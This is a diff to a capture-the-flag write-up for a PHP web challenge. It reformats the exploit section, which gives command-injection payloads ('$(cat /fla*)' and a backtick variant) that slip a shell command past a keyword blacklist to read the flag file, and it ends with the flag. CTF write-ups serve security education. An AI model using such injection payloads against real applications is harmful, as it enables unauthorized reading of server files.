@@ -81,11 +81,12 @@ isset($_GET['source']) and die(show_source(__FILE__, true));
 It set some protection such as blacklist.
 
 ## Exploit
-Use <font color="FF0000">**`$`** or **`\`**</font> string to bypass blacklist
-Payload:
-* `'$(cat /fla*)'`
-* `'`cat /fl\*g\*`'`
-
+Use **`$`** or **\`** string to bypass blacklist
+* Payload:
+    ```
+    '$(cat /fla*)'
+    '`cat /fl\*g\*`'
+    ```
 
 Flag: FLAG{Y0U_$(Byp4ssed)\_th3\_\`waf\`}
 
